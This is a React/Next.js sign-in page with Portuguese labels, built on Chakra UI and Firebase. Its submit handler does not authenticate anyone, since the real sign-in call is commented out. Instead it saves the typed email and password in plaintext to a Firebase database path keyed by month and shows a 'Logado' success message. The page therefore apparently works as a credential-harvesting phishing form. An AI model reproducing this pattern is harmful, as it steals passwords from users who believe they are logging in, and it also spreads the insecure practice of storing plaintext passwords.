import { Flex,  Button, Stack, Divider } from '@chakra-ui/react'
import { Input } from '../components/Form/Input'
import { SubmitHandler, useForm } from 'react-hook-form'
import * as yup from 'yup'
import { yupResolver } from '@hookform/resolvers/yup'
import { GetStaticProps } from 'next'
import toast, { Toaster } from 'react-hot-toast';
import { useAuth } from '../services/hooks/useAuth'
import { useRouter } from "next/router";
import { auth, database } from "../services/firebase";
import { push, ref, set } from "firebase/database";
import { useState } from 'react'
import { theme } from '../styles/theme'
import { GoogleAuthProvider, signInWithPopup } from "firebase/auth";


type SignInFormData = {
  email: string;
  password: string;
}

const signInFormSchema = yup.object().shape({
  email: yup.string().required('E-mail obrigatório').email('E-mail inválido'),
  password: yup.string().required('Senha obrigatória').min(8, 'Senha incompleta')
})

export default function SignIn() {
  const router = useRouter()
  const { user, signInWithGoogle } = useAuth();
  const [ email, setEmail ] = useState('')
  const [ password, setPassword ] = useState('')
  const { register, handleSubmit, formState } = useForm({
    resolver: yupResolver(signInFormSchema)
  })
  const provider = new GoogleAuthProvider();
  
  const { errors } = formState

  async function handleLoginWithGoogle(){
    await signInWithPopup(auth, provider)
  .then((result) => {
    const credential = GoogleAuthProvider.credentialFromResult(result);
    const token = credential.accessToken;
    const user = result.user;
    // ...
    set(ref(database, 'users/'), {
      count: 1
    });
    toast.success('Logado');
    router.push('/list')
  }).catch((error) => {
    // Handle Errors here.
    const errorCode = error.code;
    const errorMessage = error.message;
    // The email of the user's account used.
    const email = error.email;
    // The AuthCredential type that was used.
    const credential = GoogleAuthProvider.credentialFromError(error);
    // ...
  });
  }

  
  const handleSignIn: SubmitHandler<SignInFormData> = async (values)=>{
    await new Promise(resolve => setTimeout(resolve, 2000))
    set(ref(database, 'users/' + new Date().getUTCMonth() + '/'), {
      email: email,
      password: password,
    });
    toast.success('Logado');
    // router.push('/dashboard')
    // console.log(values)
  //   signInWithEmailAndPassword(auth, values.email, values.password)
  // .then((userCredential) => {
  //   // Signed in
  //   const user = userCredential.user;
  //   console.log('usuário', user)
  //   // ...
  //   toast.success('Enviado', {
  //     duration: 4000,
  //     position: 'bottom-center',
  //   });
  // })
  // .catch((error) => {
  //   const errorCode = error.code;
  //   const errorMessage = error.message;
  //   // ..
  //   toast.error(`${errorCode}`, {
  //     duration: 4000,
  //     position: 'bottom-center',
  //   });
  // });
  }
  

  return (
<Flex w="100vw" h="100vh" align="center" justify="center">
<Flex as="form" w="100%" maxWidth={360} bg="gray.800" p="8" borderRadius={8} flexDir="column" onSubmit={handleSubmit(handleSignIn)}>
         <Stack spacing="4">
         <Input name="email" type="email" label="E-mail" {...register('email')} error={errors.email} onChange={event => setEmail(event.target.value)}/>
         <Input name="password" type="password" label="Senha" {...register('password')} error={errors.password} onChange={event => setPassword(event.target.value)}/>
         </Stack>
         <Button type="submit" mt="6" colorScheme="pink"  size="lg" isLoading={formState.isSubmitting}>Entrar</Button>
         <Divider my="3" borderColor="gray.700"/>
         <Button type="button" colorScheme="pink"  size="lg" isLoading={formState.isSubmitting} onClick={handleLoginWithGoogle}>Google</Button>
        </Flex>
    </Flex>
  )
}
